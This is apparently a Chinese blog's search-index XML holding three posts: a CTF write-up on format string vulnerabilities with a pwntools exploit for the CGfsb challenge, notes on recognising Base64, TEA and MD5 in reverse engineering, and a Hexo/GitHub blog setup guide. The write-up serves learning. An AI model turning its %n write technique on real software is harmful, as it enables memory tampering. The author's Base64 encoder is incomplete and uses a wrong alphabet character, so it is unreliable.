    printf("\n");
    printf("The value of b is %d\n",b);
    return 0;
}</code></pre><p>首先运行一次程序 可以得知静态变量b的地址 然后尝试查看回显位 这里我的回显位是第十位<br><img src="https://img-blog.csdnimg.cn/20190924181656618.png" alt>尝试在运行程序时 使用printf写入地址<br><img src="https://img-blog.csdnimg.cn/2019092418190293.png" alt><br>此时就可以使用之前介绍过的 格式说明符%n了 %n将他自身前字符的个数 赋值给地址为0x5655700c的静态变量b 以达到修改内存中值的目的<br><img src="https://img-blog.csdnimg.cn/2019092418215847.png" alt><br>同样的 如果我们想将b的值修改的更大 只需要在 ‘%10$n’ 前增加对应数量的0即可<br><img src="https://img-blog.csdnimg.cn/20190924182308483.png" alt></p>
<h2 id="格式化字符串的应用"><a href="#格式化字符串的应用" class="headerlink" title="格式化字符串的应用"></a>格式化字符串的应用</h2><blockquote>
<p>这里使用攻防世界 PWN模块的 CGfsb 作为例题</p>
</blockquote>
<p>首先载入IDA 通过阅读源码 发现关键判断 只要pwnme变量等于8 就能输出flag 同时发现程序崔仔格式化字符串漏洞 这里的条件和上面模块的条件类似<br><img src="https://img-blog.csdnimg.cn/20190924184328449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>双击pwnme变量 查看pwnme的具体地址 在得知了具体地址后 我们就可以开始写脚本了<br><img src="https://img-blog.csdnimg.cn/20190924184625528.png" alt></p>
<blockquote>
<p>这里需要介绍一款工具 pwntools 它是python的一个库 平时主要常用其中的模块有</p>
<ul>
<li>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台<ul>
<li>dynelf : 用于远程符号泄漏，需要提供leak方法</li>
<li>elf : 对elf文件进行操作</li>
<li>gdb : 配合gdb进行调试</li>
<li>memleak : 用于内存泄漏</li>
<li>shellcraft : shellcode的生成器</li>
<li>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</li>
<li>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</li>
</ul>
</li>
</ul>
<p>其中比较关键的函数有</p>
<ul>
<li>连接</li>
</ul>
<pre><code>#本地连接 a=process("程序路径")

#远程连接 a=remote("主机ip","端口号")

#关闭连接 a.close()</code></pre><ul>
<li>IO</li>
</ul>
<pre><code>#发送数据 
a.send("发送的数据")

#发送一行数据 相当于在数据后加个\n 
a.sendline("发送的数据“)

#接受数据
a.recv(numb=接受的字节数,timeout=指定超时时间)

#接受一行数据 keepends为是否保留结尾的\n 
a.recvline(keepends=?)

#接受数据直到我们设置的标志出现 
a.recvuntil("标志数据")

#一直接收数据 直到EOF 
a.recvall()

#持续接收直到EOF或者timeout 
a.recvrepeat(timeout=default)

#直接进行交互 相当于回到shell的模式 在取得sell之后使用 
a.interactive()</code></pre><p>如果需要继续深入的学习可以参考大佬的博客 <a href="https://www.jianshu.com/p/355e4badab50" target="_blank" rel="noopener">https://www.jianshu.com/p/355e4badab50</a></p>
</blockquote>
<pre><code>from pwn import *

#建立本地连接
sh=process("./example")

#设置标志接受
sh.recvline("please tell me your name:")

#回复程序以继续运行
sh.send("AAAA")

sh.recvline("leave your message please:")

#设置pwnme的地址 这里的p32是将数据转为小端存储
pwnme=p32(0x0804A068)

#输出payload修改pwnme的值
sh.send(pwnme+"0000%10$n")

#程序持续运行
sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img-blog.csdnimg.cn/20190924190754182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[逆向常见的算法]]></title>
      <url>/2019/10/08/ni-xiang-chang-jian-de-suan-fa/</url>
      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>

<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><pre><code>对于Base64来说 是我们通常比较常见的加密算法 通常是应用 动态页面开发 或者是流媒体路径加密上 对于我这样的
菜鸡来说 通常常见于Web题中 但是在逆向题中也偶有见到</code></pre><p>Base64算法通俗的来讲就是 ==将3个8位字节转换为4个6位字节==</p>
<p>在重新分配完6个字节后 会在==6位字节前部补0== 将字节补成八位 也就是说 此时字节最大值为 <em>00111111=63</em><br>此时 Base64算法会将此时的字节所代表的的十进制数作为下标来索引表中进行替换 索引表如下<br>| 编号 | 字符 | 编号 | 字符 | 编号 | 字符 | 编号 | 字符 |<br>|—-|—-|—-|—-|—-|—-|—-|—-|<br>| 0  | A  | 16 | Q  | 32 | g  | 48 | w  |<br>| 1  | B  | 17 | R  | 33 | h  | 49 | x  |<br>| 2  | C  | 18 | S  | 34 | i  | 50 | y  |<br>| 3  | D  | 19 | T  | 35 | j  | 51 | z  |<br>| 4  | E  | 20 | U  | 36 | k  | 52 | 0  |<br>| 5  | F  | 21 | V  | 37 | l  | 53 | 1  |<br>| 6  | G  | 22 | W  | 38 | m  | 54 | 2  |<br>| 7  | H  | 23 | X  | 39 | n  | 55 | 3  |<br>| 8  | I  | 24 | Y  | 40 | o  | 56 | 4  |<br>| 9  | J  | 25 | Z  | 41 | p  | 57 | 5  |<br>| 10 | K  | 26 | a  | 42 | q  | 58 | 6  |<br>| 11 | L  | 27 | b  | 43 | r  | 59 | 7  |<br>| 12 | M  | 28 | c  | 44 | s  | 60 | 8  |<br>| 13 | N  | 29 | d  | 45 | t  | 61 | 9  |<br>| 14 | O  | 30 | e  | 46 | u  | 62 |+  |<br>| 15 | P  | 31 | f  | 47 | v  | 63 |/|</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMwLmNuYmxvZ3MuY29tL2Jsb2cvNDM0MTAxLzIwMTIxMi8yNjE0MTEyMS04Y2RlYmJmMjQwZDg0YWY4YTZiOGE2ZThkNmQwYmEzNC5qcGc?x-oss-process=image/format,png" alt><br>Base64算法在逆向中的体现 主要就在于==程序内存中存在一个索引表==<br><em>同理 如果是Base64解密 内存中当然存在一个解密表</em></p>
<p>并且在程序算法中存在明显的 右移2位和右移4位等明显位运算操作<br><em>同理 如果是Base64解密 应该存在左移2位和左移4位等明显的位运算操作</em></p>
<p>但是注意 Base64是可以设计变种的 即更改索引表来实现变种加密 后续还是需要自己实现下Base64加密的算法 以达到就算是更改了索引表依旧能成功解密的水平</p>
<p>具体算法设计可以查看<br><strong><a href="https://www.jianshu.com/p/61833e529cfc" target="_blank" rel="noopener">https://www.jianshu.com/p/61833e529cfc</a></strong></p>
<p><em>Base64加密代码简单实现</em></p>
<blockquote>
<p>在研究了一下午之后 写出了不完全的Base64加密算法 仅支持三位及以下的加密 代码以后会继续完善 仅供查看Base64加密的代码特征</p>
</blockquote>
<pre class=" language-C"><code class="language-C">#include <iostream>
using namespace std;

char sy[64]=
{
    'A','B','C','D','E','F',
    'G','H','I','J','K','L',
    'M','N','O','P','Q','R',
    'S','T','U','V','W','X',
    'Y','Z','a','b','c','d',
    'e','f','g','h','i','j',
    'k','l','m','n','o','p',
    'q','r','s','t','u','v',
    'w','x','y','z','0','1',
    '2','3','4','5','6','7',
    '8','9','+','-' 
};
char ans[100];
void EnBase64()
{
    int i=0;
    while(1)
    {
        int tmp1=0,tmp2=0,tmp3=0,tmp4=0;
        char a[3]={' ',' ',' '};
        cin>>a;
        if(a[0]=='#')
        {
            break;
        }

        tmp1=a[0]>>2;
        ans[i]=sy[tmp1];
        i++;

        if(a[1]=='#')
        {
            tmp2=(a[0]&3)<<4>>2;
            ans[i]=sy[tmp2];
            i++;
            ans[i]='=';
            break;    
        }

        tmp2=((a[1]>>2)|((a[0]&3)<<6))>>2;
        ans[i]=sy[tmp2];
        i++;

        if(a[2]=='#')
        {
            tmp3=(a[1]&15)<<4>>2;
            ans[i]=sy[tmp3];
            i++;
            ans[i]='=';
            break;
        }

        tmp3=(((a[1]&15)<<4)|((a[2]&192)>>4))>>2;
        ans[i]=sy[tmp3];
        i++;

        tmp4=(a[2]&63);
        ans[i]=sy[tmp4];
        i++;
        //cout<<"000";
    }    
}


int main(void)
{
    int i=0;
    EnBase64();
    cout<<ans;

} </code></pre>
<h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
<p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
<pre class=" language-C"><code class="language-C">#include <stdint.h>

void encrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

void decrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<32; i++) {                         /* basic cycle start */
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;                                   
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}</code></pre>
<p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
<p>这里给出MD5实现的伪代码</p>
<pre class=" language-C"><code class="language-C">    /Note: All variables are unsigned 32 bits and wrap modulo 2^32 when calculating
    var int[64] r, k

    //r specifies the per-round shift amounts
    r[ 0..15]：= {7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22} 
    r[16..31]：= {5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20}
    r[32..47]：= {4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23}
    r[48..63]：= {6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21}

    //Use binary integer part of the sines of integers as constants:
    for i from 0 to 63
        k[i] := floor(abs(sin(i + 1)) × 2^32)

    //Initialize variables:
    var int h0 := 0x67452301
    var int h1 := 0xEFCDAB89
    var int h2 := 0x98BADCFE
    var int h3 := 0x10325476

    //Pre-processing:
    append "1" bit to message
    append "0" bits until message length in bits ≡ 448 (mod 512)
    append bit length of message as 64-bit little-endian integer to message

    //Process the message in successive 512-bit chunks:
    for each 512-bit chunk of message
        break chunk into sixteen 32-bit little-endian words w[i], 0 ≤ i ≤ 15

    //Initialize hash value for this chunk:
    var int a := h0
    var int b := h1
    var int c := h2
    var int d := h3

    //Main loop:
    for i from 0 to 63
        if 0 ≤ i ≤ 15 then
            f := (b and c) or ((not b) and d)
            g := i
        else if 16 ≤ i ≤ 31
            f := (d and b) or ((not d) and c)
            g := (5×i + 1) mod 16
        else if 32 ≤ i ≤ 47
            f := b xor c xor d
            g := (3×i + 5) mod 16
        else if 48 ≤ i ≤ 63
            f := c xor (b or (not d))
            g := (7×i) mod 16

        temp := d
        d := c
        c := b
        b := leftrotate((a + f + k[i] + w[g]),r[i]) + b
        a := temp
    Next i
    //Add this chunk's hash to result so far:
    h0 := h0 + a
    h1 := h1 + b 
    h2 := h2 + c
    h3 := h3 + d
    End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)</code></pre>
<p>MD5算法的显著特征就是 ==存在4个变量 h0=0x67452301 h1=0xefcdab89 h2=0x98badcfe h3=0x10325476==</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> RE </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Hexo配合Github搭建自己的博客]]></title>
      <url>/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h2><p><strong>1.安装Git Bash</strong></p>
<p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">下载地址</a></p>
<p>安装流程: 无脑下一步即可<br>安装好后 在任意处右键打开Git Bash 输入</p>
<blockquote>
<p>git version</p>
</blockquote>
<p>来查看当前的Git Bash版本 如果客户端正常显示版本即为安装成功</p>
<p><strong>2.安装Node JS</strong></p>
<p>由于Hexo是基于Node JS环境的静态博客 所以一般来说还是装一下吧…<br><a href="https://nodejs.org/en/" target="_blank" rel="noopener">下载地址</a></p>
<p>安装流程:下载好之后双击安装 注意勾选 <kbd>Add to Path</kbd> 这样做的好处就是不用自己去配置环境变量了 然后继续下一步即可</p>
<p><strong>3.安装Hexo</strong></p>
<p>这就是我们博客的关键了 不用紧张 我们不需要去费尽心思的找安装包 直接创建一个文件夹(以后存放博客的地方) 然后进入文件夹 右键<kbd>Git Bash here</kbd> 然后输入安装命令 <kbd>npm i -g hexo</kbd>静等安装完毕即可 </p>
<p>在安装完Hexo后就是初始化了 输入初始化命令<br><kbm>hexo init</kbm> 然后等待完成即可</p>
<h2 id="连接Github"><a href="#连接Github" class="headerlink" title="连接Github"></a>连接Github</h2><p>没有账号的创建账号 这就不说了..有了账号的 新建仓库 仓库名称<strong>必须</strong>为 <strong>自己的用户名.github.io</strong></p>
<p>在创建完成后 返回到gitbash中 来配置自己的github账户信息</p>
<p>在Git Bash中输入 </p>
<p><kbm>git config –global user.name “自己的github用户名”</kbm></p>
<p><kbm>git config –global user.email “自己注册github的邮箱”</kbm></p>
<p>接下来就是创建SSH keys将gitbash和github连接起来 在bash中输入 </p>
<p><kbm>ssh-keygen -t rsa -C “自己的邮箱”</kbm></p>
<p>然后使用git命令 来复制ssh key</p>
<p><kbm>paste < ~/.ssh/id_rsa.pub</kbm></p>
<p>接着打开github的账户设置 选择<em>SSH and GPG keys</em> 然后<em>New SSH key</em> 标题随便填 把复制好的ssh粘进去就完事了 确定粘完之后回到bash 测试是否成功</p>
<p><kbm>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> </kbm></p>
<p>如果提示 <kbm>Are you sure you want to continue connecting (yes/no)?</kbm> 输入yes 然后就会看到</p>
<blockquote>
<p>Hi ***! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
</blockquote>
<p>这个时候SSH已经配置成功了 </p>
<h2 id="配置博客"><a href="#配置博客" class="headerlink" title="配置博客"></a>配置博客</h2><p>这个时候博客的雏形已经搭建出来了 就是有点丑..我们先去github上 随便找个自己喜欢的主题<br>然后放到<strong>博客根目录下的themes</strong>里即可</p>
<p>然后打开 <strong>_config.yml</strong> 来具体配置博客的信息 如图所示修改属于自己的信息 将Du4t改成自己的github用户名即可<br><img src="https://i.loli.net/2019/10/08/zuGNOlStARIfHdw.png" alt="1.png" title="配置1"><br><img src="https://i.loli.net/2019/10/08/9vPSRmlU61AyGIk.png" alt="2.png" title="配置2"></p>
<h2 id="书写自己的博客"><a href="#书写自己的博客" class="headerlink" title="书写自己的博客"></a>书写自己的博客</h2><p>在bash中输入<kbm>hexo new 文章名</kbm> 然后就可以去_post文件夹中找到自己的博客了 使用MarkDown语法书写自己的博文即可</p>
<h2 id="上传github"><a href="#上传github" class="headerlink" title="上传github"></a>上传github</h2><p>还是先安装一波 <kbm>npm install hexo-deployer-git –save</kbm> 安装完成后我们就可以通过bash直接将自己的博客部署到github上让别人看到了 </p>
<p><em>建议每次都按照以下步骤部署自己的博客！</em></p>
<p><kbm>hexo clean</kbm></p>
<p><kbm>hexo g</kbm></p>
<p><kbm>hexo d</kbm></p>
<p>等待部署完毕 去 <em>自己的用户名.github.io</em> 就可以看到自己的博客了</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Others </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
